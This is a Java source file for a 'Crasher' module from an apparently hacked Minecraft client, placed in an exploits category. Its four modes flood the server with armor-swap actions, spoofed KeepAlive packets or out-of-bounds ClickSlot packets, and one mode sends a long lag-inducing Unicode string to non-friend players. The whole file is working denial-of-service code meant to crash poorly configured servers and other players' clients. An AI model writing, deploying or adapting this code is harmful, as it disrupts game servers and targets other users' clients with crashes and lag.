package dev.realme.ash.impl.module.exploit;

import dev.realme.ash.api.config.Config;
import dev.realme.ash.api.config.setting.EnumConfig;
import dev.realme.ash.api.event.EventStage;
import dev.realme.ash.api.event.listener.EventListener;
import dev.realme.ash.api.module.ModuleCategory;
import dev.realme.ash.api.module.ToggleModule;
import dev.realme.ash.impl.event.TickEvent;
import dev.realme.ash.impl.event.network.PacketEvent;
import dev.realme.ash.init.Managers;
import dev.realme.ash.util.chat.ChatUtil;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ArmorItem;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.s2c.common.KeepAliveS2CPacket;
import net.minecraft.network.packet.s2c.play.EntityStatusS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;

public class CrasherModule
extends ToggleModule {
    final Config<CrasherMode> modeConfig = new EnumConfig<>("Mode", "The exploit mode to use when crashing", CrasherMode.ARMOR, CrasherMode.values());
    private long keepAliveId;
    private static final String LAG_MESSAGE = "āȁ́Ё\u0601܁ࠁँਁଁก༁ခᄁሁጁᐁᔁᘁᜁ᠁ᤁᨁᬁᰁᴁḁἁ℁∁⌁␁━✁⠁⤁⨁⬁Ⰱⴁ⸁⼁、\u3101㈁㌁㐁㔁㘁㜁㠁㤁㨁㬁㰁㴁㸁㼁䀁䄁䈁䌁䐁䔁䘁䜁䠁䤁䨁䬁䰁䴁丁企倁儁刁匁吁唁嘁圁堁夁威嬁封崁币弁态愁戁持搁攁昁朁栁椁樁欁氁洁渁漁瀁焁爁猁琁甁瘁省码礁稁笁簁紁縁缁老脁舁茁萁蔁蘁蜁蠁褁訁謁谁贁踁輁送鄁鈁錁鐁锁阁霁頁餁騁鬁鰁鴁鸁鼁ꀁꄁꈁꌁꐁꔁꘁ꜁ꠁ꤁ꨁꬁ각괁긁꼁뀁넁눁댁됁딁똁뜁렁뤁먁묁밁봁";

    public CrasherModule() {
        super("Crasher", "Attempts to crash poorly configured clients/servers", ModuleCategory.EXPLOITS);
    }

    @EventListener
    public void onTick(TickEvent event) {
        if (event.getStage() != EventStage.PRE) {
            return;
        }
        switch (this.modeConfig.getValue()) {
            case ARMOR: {
                for (int i = 0; i < 300; ++i) {
                    if (CrasherModule.mc.player.getInventory().getStack(38).getItem() != Items.AIR) {
                        CrasherModule.mc.interactionManager.clickSlot(CrasherModule.mc.player.currentScreenHandler.syncId, 6, 0, SlotActionType.SWAP, CrasherModule.mc.player);
                    }
                    if (!(CrasherModule.mc.player.getMainHandStack().getItem() instanceof ArmorItem)) continue;
                    CrasherModule.mc.interactionManager.interactItem(CrasherModule.mc.player, Hand.MAIN_HAND);
                }
                break;
            }
            case CONSOLE: {
                for (int i = 0; i < 5; ++i) {
                    KeepAliveC2SPacket packet = new KeepAliveC2SPacket(this.keepAliveId++);
                    try {
                        Managers.NETWORK.sendPacket(packet);
                        continue;
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                break;
            }
            case OUT_OF_BOUNDS: {
                for (int i = 0; i < 100; ++i) {
                    ItemStack stack = new ItemStack(CrasherModule.mc.player.getMainHandStack().getItem());
                    ClickSlotC2SPacket packet = new ClickSlotC2SPacket(0, 69, CrasherModule.mc.player.currentScreenHandler.getRevision(), 1, SlotActionType.QUICK_MOVE, stack, new Int2ObjectOpenHashMap<>());
                    try {
                        Managers.NETWORK.sendPacket(packet);
                        continue;
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                break;
            }
        }
    }

    @EventListener
    public void onPacketInbound(PacketEvent.Receive event) {
        if (CrasherModule.mc.player == null || CrasherModule.mc.world == null) {
            return;
        }
        Packet<?> packet = event.getPacket();
        if (packet instanceof KeepAliveS2CPacket) {
            KeepAliveS2CPacket packet2 = (KeepAliveS2CPacket) packet;
            this.keepAliveId = packet2.getId();
        } else {
            PlayerEntity player;
            Entity entity;
            EntityStatusS2CPacket packet3;
            packet = event.getPacket();
            if (packet instanceof EntityStatusS2CPacket && (packet3 = (EntityStatusS2CPacket) packet).getStatus() == 35 && this.modeConfig.getValue() == CrasherMode.UNICODE && (entity = packet3.getEntity(CrasherModule.mc.world)) instanceof PlayerEntity && (player = (PlayerEntity)entity) != CrasherModule.mc.player && !Managers.SOCIAL.isFriend(player.getName())) {
                ChatUtil.serverSendMessage(player, LAG_MESSAGE);
            }
        }
    }

    public enum CrasherMode {
        ARMOR,
        CONSOLE,
        OUT_OF_BOUNDS,
        UNICODE

    }
}
